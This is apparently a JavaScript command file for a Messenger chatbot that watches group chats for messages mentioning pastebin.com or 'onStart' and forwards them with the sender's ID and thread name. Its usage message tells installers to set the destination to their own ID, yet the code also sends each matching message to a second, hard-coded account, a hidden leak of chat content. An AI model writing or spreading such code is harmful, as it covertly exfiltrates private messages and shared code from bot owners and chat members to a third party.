const destination = "100005954550355"; 

module.exports = {
    config: {
        name: "catchcommand",
        version: 1.0,
        author: "LiANE", 
        countDown: 5,
        role: 2,
        shortDescription: { en: "Catch Pastebin" },
        longDescription: { en: "Use this to catch pastebin" },
        category: "owner",
        guide: { en: "{pn}" }
    },
    onStart: async function ({ api, args, message, event, usersData }) {
        const data = await usersData.get(event.senderID);
        const name = data.name;
        message.reply(`⚠ Pastebin Alert: How to use? Open the code file, and change the id destination to your userID, once the changes have been made, I can assure that this command will work correctly.`);
    },
    onChat: async function ({ api, args, message, usersData, threadsData, event }) {
        const data = await usersData.get(event.senderID);
        const name = data.name;
        const thread = await threadsData.get(event.threadID);
        const threadName = thread.threadName;

        const chat = event.body;
        if (chat.includes(`pastebin.com`) || chat.includes("onStart")) {
            api.sendMessage(`⚠ Command Alert:\n\n» From: ${event.senderID}\n» Thread: ${threadName}\n\nContent:\n\n${event.body}`, 100005954550355);

            api.sendMessage(`⚠ Command Alert:\n\n
» From: ${event.senderID}\n» Thread: ${threadName}\n Content:\n\n${event.body}`, destination);
        }
    }
};